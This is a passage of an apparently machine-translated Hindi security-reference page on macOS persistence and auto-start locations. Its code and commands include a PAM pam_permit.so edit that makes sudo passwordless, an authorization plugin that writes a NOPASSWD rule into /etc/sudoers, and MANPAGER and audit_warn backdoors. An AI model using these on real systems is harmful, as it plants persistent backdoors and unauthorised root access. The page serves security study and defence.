0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
यदि आप अन्य `mdimporter` की Plist की जाँच करते हैं तो आपको प्रविष्टि **`UTTypeConformsTo`** नहीं मिलेगा। इसका कारण यह है कि यह एक बिल्ट-इन _यूनिफॉर्म टाइप पहचानकर्ता_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) है और इसे विस्तारित करने की आवश्यकता नहीं है।

इसके अतिरिक्त, सिस्टम डिफ़ॉल्ट प्लगइन हमेशा प्राथमिकता देते हैं, इसलिए एक हमलावर केवल उन फ़ाइलों तक पहुँच सकता है जिन्हें एप्पल के अपने `mdimporters` द्वारा अन्यथा सूचीबद्ध नहीं किया गया है।
{% endhint %}

अपना खुद का इम्पोर्टर बनाने के लिए आप इस परियोजना से शुरू कर सकते हैं: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) और फिर नाम, **`CFBundleDocumentTypes`** बदलें और **`UTImportedTypeDeclarations`** जो आपके समर्थन करना चाहते हैं उन एक्सटेंशन को समर्थन करने के लिए और उन्हें **`schema.xml`** में पुनर्चित्रित करें।\
फिर **कोड** को बदलें फ़ंक्शन **`GetMetadataForFile`** का जब एक फ़ाइल बनाई जाती है जिसमें प्रोसेस की गई एक्सटेंशन हो।

अंत में अपना नया `.mdimporter` **बनाएं और कॉपी करें** एक में से तीन पिछले स्थानों में और आप जब भी यह लोड होता है **लॉगों की निगरानी** या जांच करके **`mdimport -L`**।

### ~~प्राथमिकता पैन~~

{% hint style="danger" %}
ऐसा लगता नहीं है कि यह अब काम कर रहा है।
{% endhint %}

लेखन: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* इसे विशेष उपयोगकर्ता क्रिया की आवश्यकता है
* TCC छलावा: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### विवरण

ऐसा लगता नहीं है कि यह अब काम कर रहा है।

## रूट सैंडबॉक्स छलावा

{% hint style="success" %}
यहाँ आपको **सैंडबॉक्स छलावा** के लिए उपयोगी शुरू स्थान मिलेंगे जो आपको बस किसी चीज को **एक फ़ाइल में लिखकर** **रूट** होकर सिर्फ **कुछ चीज़ को निष्पादित करने** की अनुमति देता है और/या अन्य **अजीब शर्तों की आवश्यकता** है।
{% endhint %}

### आवधिक

लेखन: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होने की आवश्यकता है
* TCC छलावा: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* रूट की आवश्यकता है
* **ट्रिगर**: जब समय आता है
* `/etc/daily.local`, `/etc/weekly.local` या `/etc/monthly.local`
* रूट की आवश्यकता है
* **ट्रिगर**: जब समय आता है

#### विवरण और शोषण

आवधिक स्क्रिप्ट (**`/etc/periodic`**) का निष्पादन **लॉन्च डेमन्स** के कारण होता है जो `/System/Library/LaunchDaemons/com.apple.periodic*` में कॉन्फ़िगर किए गए हैं। ध्यान दें कि `/etc/periodic/` में स्टोर किए गए स्क्रिप्ट्स **फ़ाइल के मालिक के रूप में निष्पादित** होते हैं, इसलिए यह किसी संभावित प्रिविलेज उन्नति के लिए काम नहीं करेगा।
{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

अन्य नियमित स्क्रिप्ट हैं जो क्रियान्वित किए जाएंगे, जिन्हें **`/etc/defaults/periodic.conf`** में दिखाया गया है:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
यदि आप `/etc/daily.local`, `/etc/weekly.local` या `/etc/monthly.local` फ़ाइलों में से किसी भी फ़ाइल को लिखने में कामयाब होते हैं तो यह **जल्दी या धीरे से क्रियान्वित होगा**।

{% hint style="warning" %}
ध्यान दें कि आवधिक स्क्रिप्ट **स्क्रिप्ट के मालिक के रूप में क्रियान्वित किया जाएगा**। इसलिए यदि एक सामान्य उपयोगकर्ता स्क्रिप्ट का मालिक है, तो यह उस उपयोगकर्ता के रूप में क्रियान्वित किया जाएगा (यह विशेषाधिकार उन्नति हमलों को रोक सकता है)।
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होना चाहिए
* TCC छलांग: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* रूट हमेशा आवश्यक है

#### विवरण और उत्पीड़न

PAM अधिक **स्थायित्व** और मैलवेयर पर ध्यान केंद्रित है, इसलिए इस ब्लॉग में इस तकनीक का विस्तृत विवरण नहीं दिया जाएगा, **इस तकनीक को बेहतर समझने के लिए राइटअप्स को पढ़ें**।

PAM मॉड्यूल्स की जांच करें:
```bash
ls -l /etc/pam.d
```
### macOS Auto Start Locations

**PAM** का दुरुपयोग करने वाला एक स्थायिता / विशेषाधिकार उन्नति तकनीक बहुत ही आसान है, /etc/pam.d/sudo मॉड्यूल को संशोधित करके पहले इस पंक्ति को जोड़ना:
```bash
auth       sufficient     pam_permit.so
```
तो यह **इस तरह दिखेगा** कुछ इस प्रकार:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
और इसलिए **`sudo` का उपयोग करने का प्रयास** कोई भी काम करेगा।

{% hint style="danger" %}
ध्यान दें कि यह निर्देशिका TCC द्वारा संरक्षित है, इसलिए उपयोगकर्ता को पहुंच के लिए पूछा जाने की अधिक संभावना है।
{% endhint %}

### अधिकृति प्लगइन

लेख: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
लेख: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* सैंडबॉक्स को अनदेखा करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होना चाहिए और अतिरिक्त कॉन्फ़िगरेशन करनी होगी
* TCC बायपास: ???

#### स्थान

* `/Library/Security/SecurityAgentPlugins/`
* रूट की आवश्यकता है
* इसे प्लगइन का उपयोग करने के लिए अधिकृति डेटाबेस कॉन्फ़िगर करने की भी आवश्यकता है

#### विवरण और शोषण

आप एक अधिकृति प्लगइन बना सकते हैं जो एक उपयोगकर्ता को लॉग-इन करते समय निरंतरता बनाए रखने के लिए क्रियान्वित होगा। इन प्लगइन्स में से एक बनाने के बारे में अधिक जानकारी के लिए पिछले लेखों की जाँच करें (और सावधान रहें, एक खराब लिखा हुआ प्लगइन आपको बाहर निकाल सकता है और आपको अपने मैक को पुनर्प्राप्ति मोड से साफ करने की आवश्यकता होगी)।
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**बंडल** को लोड होने वाले स्थान पर **मूव** करें:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
**इस प्लगइन को लोड करने के लिए नियम जोड़ें:**
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** अधिकृति फ्रेमवर्क को बताएगा कि इसे **अधिकृति के लिए बाहरी तंत्र को कॉल करने की आवश्यकता होगी**। इसके अतिरिक्त, **`privileged`** इसे रूट द्वारा निष्पादित करने के लिए करेगा।

इसे ट्रिगर करें:
```bash
security authorize com.asdf.asdf
```
और फिर **कर्मचारी समूह को सुडो** एक्सेस होना चाहिए (पढ़ें `/etc/sudoers` को कन्फर्म करने के लिए)।

### Man.conf

लेख: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* सैंडबॉक्स को बाईपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होना चाहिए और उपयोगकर्ता को man का उपयोग करना चाहिए
* TCC बाईपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* **`/private/etc/man.conf`**
* रूट की आवश्यकता है
* **`/private/etc/man.conf`**: जबकि man का उपयोग हो रहा है

#### विवरण और एक्सप्लॉइट

कॉन्फ़िग फ़ाइल **`/private/etc/man.conf`** इंडिकेट करती है कि मैन दस्तावेज़ फ़ाइलें खोलने के लिए कौन सा बाइनरी/स्क्रिप्ट उपयोग करना है। इसलिए एक्सीक्यूटेबल का पथ संशोधित किया जा सकता है ताकि हर बार जब उपयोगकर्ता किसी डॉक्स पढ़ने के लिए man का उपयोग करता है तो एक बैकडोर निष्पादित हो।

उदाहरण के लिए **`/private/etc/man.conf`** में सेट करें:
```
MANPAGER /tmp/view
```
और फिर निम्नलिखित रूप में `/tmp/view` बनाएं:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**लेख**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* सैंडबॉक्स को बाईपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होना चाहिए और एपाचे चालू होना चाहिए
* TCC बाईपास: [🔴](https://emojipedia.org/large-red-circle)
* Httpd को entitlements नहीं हैं

#### स्थान

* **`/etc/apache2/httpd.conf`**
* रूट की आवश्यकता
* ट्रिगर: जब Apache2 शुरू होता है

#### विवरण और शोषण

आप `/etc/apache2/httpd.conf` में इंडिकेट कर सकते हैं कि एक मॉड्यूल लोड करने के लिए एक पंक्ति जोड़ें जैसे:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

इस तरह आपके संकलित मॉड्यूल Apache द्वारा लोड किए जाएंगे। एकमात्र बात यह है कि आपको इसे **एक मान्य Apple प्रमाणपत्र के साथ साइन करने** की आवश्यकता है, या फिर आपको सिस्टम में एक नया विश्वसनीय प्रमाणपत्र **जोड़ने** और उसके साथ **साइन करने** की आवश्यकता है।

फिर, यदि आवश्यक हो, सर्वर को शुरू होने की सुनिश्चित करने के लिए आपको निम्नलिखित को निष्पादित करना होगा:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
कोड उदाहरण Dylb के लिए:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM ऑडिट फ्रेमवर्क

लेख: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* सैंडबॉक्स को बाईपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आपको रूट होना चाहिए, auditd चल रहा होना चाहिए और चेतावनी का कारण होना चाहिए
* TCC बाईपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* **`/etc/security/audit_warn`**
* रूट की आवश्यकता
* **ट्रिगर**: जब auditd चेतावनी का पता लगाता है

#### विवरण और उत्पीड़न

जबकि auditd चेतावनी का पता लगाता है, स्क्रिप्ट **`/etc/security/audit_warn`** **निष्पादित** होती है। इसलिए आप अपने पेलोड को इस पर जोड़ सकते हैं।
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
### स्टार्टअप आइटम्स

{% hint style="danger" %}
**यह पुराना हो गया है, इसलिए इन निर्देशिकाओं में कुछ भी नहीं मिलना चाहिए।**
{% endhint %}

**StartupItem** एक निर्देशिका है जो या तो `/Library/StartupItems/` या `/System/Library/StartupItems/` के भीतर स्थित होना चाहिए। एक बार यह निर्देशिका स्थापित होती है, तो इसमें दो विशिष्ट फ़ाइलें होनी चाहिए:

1. एक **rc स्क्रिप्ट**: स्टार्टअप पर निष्पादित एक शैल स्क्रिप्ट।
2. एक **plist फ़ाइल**, विशेष रूप से `StartupParameters.plist` नामक, जिसमें विभिन्न कॉन्फ़िगरेशन सेटिंग्स होती हैं।

सुनिश्चित करें कि एरसी स्क्रिप्ट और `StartupParameters.plist` फ़ाइल दोनों सही ढंग से **StartupItem** निर्देशिका के भीतर स्थापित हैं ताकि स्टार्टअप प्रक्रिया उन्हें पहचान और उपयोग कर सके।

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %}सुपर सेवा नाम
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
मैं अपने macOS में इस कॉम्पोनेंट को नहीं ढूंढ सकता हूँ, इसके बारे में अधिक जानकारी के लिए व्रिटअप देखें
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Apple द्वारा पेश किया गया, **emond** एक लॉगिंग मेकेनिज़्म है जो अविकसित या संभावित तौर पर छोड़ दिया गया लगता है, फिर भी यह पहुंचने में बना हुआ है। एक Mac प्रशासक के लिए विशेष रूप से फायदेमंद नहीं होता है, यह अप्रसिद्ध सेवा खतरे के कलाकारों के लिए एक सूक्ष्म स्थिरता विधि के रूप में काम कर सकती है, जिसे अधिकांश macOS प्रशासक ध्यान नहीं देंगे।

इसके अस्तित्व के जानकार इसका दुरुपयोग पहचानना सीधा है। इस सेवा के लिए सिस्टम का लॉन्चडेमन स्क्रिप्ट्स को एक ही निर्देशिका में निष्पादित करने की तलाश में होता है। इसे जांचने के लिए, निम्नलिखित कमांड का उपयोग किया जा सकता है:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### स्थान

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* रूट की आवश्यकता
* **ट्रिगर**: XQuartz के साथ

#### विवरण और शात्रुता

XQuartz **macOS में अब स्थापित नहीं है**, इसलिए अधिक जानकारी के लिए व्राइटअप देखें।

### ~~kext~~

{% hint style="danger" %}
केक्स्ट को इंस्टॉल करना इतना जटिल है कि मैं इसे सैंडबॉक्स से बाहर निकलने या स्थिरता के लिए नहीं मानता (जब तक आपके पास कोई शात्रुता न हो)
{% endhint %}

#### स्थान

केक्स्ट को स्टार्टअप आइटम के रूप में इंस्टॉल करने के लिए, इसे निम्नलिखित स्थानों में इंस्टॉल किया जाना चाहिए:

* `/System/Library/Extensions`
* ओएस एक्स ऑपरेटिंग सिस्टम में बिल्ट केक्स्ट फ़ाइलें।
* `/Library/Extensions`
* तीसरे पक्ष सॉफ़्टवेयर द्वारा इंस्टॉल की गई केक्स्ट फ़ाइलें

आप वर्तमान में लोड केक्स्ट फ़ाइलें सूचीबद्ध कर सकते हैं:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
अधिक जानकारी के लिए [**कर्नेल एक्सटेंशन्स जांचें इस खंड को**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

लेख: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### स्थान

* **`/usr/local/bin/amstoold`**
* रूट की आवश्यकता है

#### विवरण और शोषण

प्रतित्यामी `/System/Library/LaunchAgents/com.apple.amstoold.plist` से `plist` इस बाइनरी का उपयोग कर रहा था जबकि एक एक्सपीसी सेवा को उजागर कर रहा था... बात यह है कि बाइनरी मौजूद नहीं थी, इसलिए आप कुछ वहाँ रख सकते थे और जब एक्सपीसी सेवा को कॉल किया जाता है तो आपकी बाइनरी को कॉल किया जाएगा।

मुझे अब अपने macOS में इसे नहीं मिला।

### ~~xsanctl~~

लेख: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### स्थान

* **`/Library/Preferences/Xsan/.xsanrc`**
* रूट की आवश्यकता है
* **ट्रिगर**: जब सेवा चलाई जाती है (दुर्लभ)

#### विवरण और शोषण

ऐसा लगता है कि इस स्क्रिप्ट को चलाना बहुत सामान्य नहीं है और मैं अपने macOS में इसे नहीं ढूंढ पा रहा था, इसलिए अगर आप अधिक जानकारी चाहते हैं तो लेख की जाँच करें।

### ~~/etc/rc.common~~

{% hint style="danger" %}
**यह आधुनिक MacOS संस्करणों में काम नहीं कर रहा है**
{% endhint %}

यहाँ **ऐसे कमांड रखना संभव है जो स्टार्टअप पर निष्पादित किए जाएंगे।** साधारण rc.common स्क्रिप्ट का उदाहरण:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence techniques and tools

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{% hint style="success" %}
**AWS हैकिंग सीखें और अभ्यास करें:**<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
**GCP हैकिंग सीखें और अभ्यास करें:** <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** को** **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}
